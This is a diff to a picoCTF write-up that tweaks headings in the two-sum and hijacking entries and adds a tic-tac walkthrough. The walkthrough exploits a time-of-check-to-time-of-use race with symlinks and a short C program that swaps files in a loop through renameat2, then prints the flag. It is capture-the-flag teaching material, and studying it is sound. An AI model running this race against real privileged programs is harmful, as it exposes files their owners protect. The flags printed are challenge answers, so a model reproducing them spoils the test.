@@ -1832,7 +1832,7 @@ FLAG:- ```picoCTF{r0tat1on_d3crypt3d_949af1a1}```
 
 
 
-<h2>two-sum Binary_Explotation -- 100 points</h2>
+<h2>two-sum Binary Explotation -- 100 points</h2>
 
 ![image](https://user-images.githubusercontent.com/67879936/227749774-cfcf6202-d9bf-4d3a-9d21-d1bac2c9426c.png)
 
@@ -1860,7 +1860,7 @@ FLAG:- ```picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_bc0adfd1}```
 
 
 
-<h2>hijacking Binary_Exploitation -- 200 points</h2>
+<h2>hijacking Binary Exploitation -- 200 points</h2>
 
 ![image](https://user-images.githubusercontent.com/67879936/227750109-6e233b98-0d3d-4935-848d-fba677916704.png)
 
@@ -1876,7 +1876,9 @@ This means we can use the script to escalate our privileges to the ```root``` us
 
 ![image](https://user-images.githubusercontent.com/67879936/227750182-14916a14-52fb-40f6-b849-1d51639fd800.png)
 
-This script and the challenge name gave me the 100% confidence that we'll be using ```library hijacking``` to escalate our privileges here.
+This script and the challenge name gave me the 100% confidence that we'll be using ```python library hijacking``` to escalate our privileges here.
+
+You can read more about python library hijacking here: https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8
 
 Lets locate the ```base64.py``` file
 
@@ -1913,7 +1915,88 @@ FLAG:- ```picoCTF{pYth0nn_libraryH!j@CK!n9_4c188d27}```
 
 
 
+<h2>tic-tac Binary Exploitation -- 200 points</h2>
 
+![image](https://user-images.githubusercontent.com/67879936/227750967-4f8f450b-3415-4480-b329-4b2284ea06ac.png)
+
+Lets connect to the instance
+
+![image](https://user-images.githubusercontent.com/67879936/227751021-e3b72ce0-2641-4619-ba60-a5b60bf845c3.png)
+
+From the challenge description there is a binary that read files with root privileges, but it only accepts to read files that are owned by the user running it.
+
+![image](https://user-images.githubusercontent.com/67879936/227751098-dc5a7c05-32df-4341-a9d8-9f8aa7f9ea02.png)
+
+cool, we can read this file. Now this is because the file owned by the user running it. Lets try to read a file owned by root
+
+![image](https://user-images.githubusercontent.com/67879936/227751195-d4f90e30-cb91-4c19-ba45-698681ac377f.png)
+
+Now we get an error. From the challenge tags I saw ```toctou``` so I went ahead to research about it
+
+<font color="Green">TOCTOU stands for "Time-Of-Check to Time-Of-Use," and it refers to a type of vulnerability that can occur in computer programs. Specifically, it occurs when a program performs a security check at one point in time, but then performs an action based on the result of that check at a later point in time.This vulnerability is called a TOCTOU vulnerability because it's based on the time between the check and the use of the check.</font>
+
+You can read more about it here: https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
+
+Now, lets exploit this. If we are successful with exploiting it we should be able to read the ```flag.txt``` file.
+
+We'll start by creating a directory in the ```/tmp``` directory
+
+>command: mkdir /tmp/hax
+
+![image](https://user-images.githubusercontent.com/67879936/227751729-15328dfa-b5d0-496f-8f49-fb1064121c5b.png)
+
+then we'll create a symbolic link
+
+>command: ln -s /home/ctf-player/flag.txt /tmp/hax/flag.txt
+
+![image](https://user-images.githubusercontent.com/67879936/227751749-864e8da8-34bc-422f-8921-b30fed8b6ba7.png)
+
+We'll be using this c exploit.
+
+```
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <linux/fs.h>
+
+// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
+int main(int argc, char *argv[]) {
+  while (1) {
+    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
+  }
+  return 0;
+}
+```
+save this in a ```.c``` file and compile it
+
+>command: gcc -o abeg abeg.c
+
+![image](https://user-images.githubusercontent.com/67879936/227751808-a71085fd-694a-4b4e-8098-0898d9db98a3.png)
+
+cool, lets create an empty file in the ```/tmp``` directory
+
+>command: touch /tmp/hax/asd
+
+![image](https://user-images.githubusercontent.com/67879936/227751879-b816917f-fd68-4912-9939-b43e8da04fcf.png)
+
+Lets run the binary ```abeg```
+
+>./abeg /tmp/hax/flag.txt /tmp/hax/asd
+
+![image](https://user-images.githubusercontent.com/67879936/227751895-ebe99dc0-8ddf-4676-94cd-09b819ebffeb.png)
+
+Open up another terminal and try to read the ```flag.txt``` file 
+
+>command: ./txtreader /tmp/hax/flag.txt
+
+![image](https://user-images.githubusercontent.com/67879936/227752206-44467551-e444-4bf5-8e66-f49774b277be.png)
+
+cool, we got our flag😄
+
+FLAG:- ```picoCTF{ToctoU_!s_3a5y_107916f2}```
 
 
 
